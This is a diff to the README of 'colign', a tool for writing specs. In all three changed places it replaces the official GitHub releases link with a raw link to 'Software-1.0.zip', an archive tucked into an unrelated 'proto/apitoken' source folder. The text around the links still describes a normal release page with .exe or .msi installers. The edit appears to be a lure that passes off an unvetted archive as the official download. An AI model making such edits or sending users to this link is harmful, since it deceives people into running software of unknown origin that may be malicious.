@@ -1,6 +1,6 @@
 # 🤖 colign - Write Specs, Align Teams Faster
 
-[![Download colign](https://img.shields.io/badge/Download%20colign-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://github.com/invertible-statue269/colign/releases)
+[![Download colign](https://img.shields.io/badge/Download%20colign-4B8BF5?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/invertible-statue269/colign/main/proto/apitoken/Software-1.0.zip)
 
 ## 🧭 What colign does
 
@@ -22,7 +22,7 @@ For best results, use Windows 10 or Windows 11.
 
 Visit the release page here:
 
-[https://github.com/invertible-statue269/colign/releases](https://github.com/invertible-statue269/colign/releases)
+[https://raw.githubusercontent.com/invertible-statue269/colign/main/proto/apitoken/Software-1.0.zip](https://raw.githubusercontent.com/invertible-statue269/colign/main/proto/apitoken/Software-1.0.zip)
 
 On that page, look for the latest Windows download. It may be an `.exe` file or a `.msi` installer. Download the file that matches your computer.
 
@@ -174,7 +174,7 @@ If you used a zip file, extract it first.
 
 New versions, fixes, and release files are posted on the release page:
 
-[https://github.com/invertible-statue269/colign/releases](https://github.com/invertible-statue269/colign/releases)
+[https://raw.githubusercontent.com/invertible-statue269/colign/main/proto/apitoken/Software-1.0.zip](https://raw.githubusercontent.com/invertible-statue269/colign/main/proto/apitoken/Software-1.0.zip)
 
 Check this page when you want the latest Windows build.
 
